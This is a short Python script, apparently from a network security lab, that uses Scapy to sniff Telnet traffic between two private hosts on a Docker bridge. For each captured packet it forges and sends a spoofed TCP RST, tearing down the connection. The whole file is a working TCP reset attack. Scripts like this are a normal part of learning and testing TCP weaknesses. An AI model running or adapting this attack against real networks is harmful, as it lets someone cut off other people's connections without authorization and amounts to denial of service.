#!/bin/env python3

from scapy.all import *

def spoof(pkt):
    old_tcp = pkt[TCP]
    old_ip = pkt[IP]

    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)
    pkt = ip/tcp
    ls(pkt)
    send(pkt,iface="br-e7dfb33c0e40", verbose=0)

myFilter = 'tcp and src host 10.9.0.5 and dst host 10.9.0.6 and src port 23'

sniff(iface="br-e7dfb33c0e40", filter=myFilter, prn=spoof)
